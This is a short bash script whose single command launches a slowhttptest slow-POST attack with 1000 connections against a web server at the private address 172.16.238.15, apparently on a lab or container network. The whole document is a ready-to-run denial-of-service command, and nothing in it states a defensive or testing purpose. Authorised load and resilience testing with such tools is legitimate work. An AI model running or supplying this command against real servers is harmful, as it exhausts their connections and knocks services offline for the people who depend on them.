#!/bin/bash

slowhttptest -c 1000 -B -i 10 -r 200 -t POST -u http://172.16.238.15 -x 24 -p 3
